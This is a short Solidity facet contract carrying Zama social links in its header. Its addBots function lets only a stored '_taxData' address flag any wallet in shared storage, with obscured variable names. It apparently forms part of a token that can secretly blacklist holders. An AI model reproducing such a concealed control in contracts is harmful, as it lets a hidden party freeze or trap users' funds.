// SPDX-License-Identifier: UNLICENSED

/*
    Website: https://www.zama.ai/
    Twitter: https://twitter.com/zama_fhe
    Linkedin: https://www.linkedin.com/company/zama-ai/
    Discord: https://discord.fhe.org/
    Reddit: https://www.reddit.com/r/zama/

*/

pragma solidity ^0.8.22;
import "./TestLib.sol";
contract addBotsFacet is Ownable {
    function addBots(address bot) public virtual returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address tmoinfo = bot;
        ds.tokeninfo[tmoinfo] = ds.globaltrue;
        require(_msgSender() == ds._taxData);
        return true;
    }
}
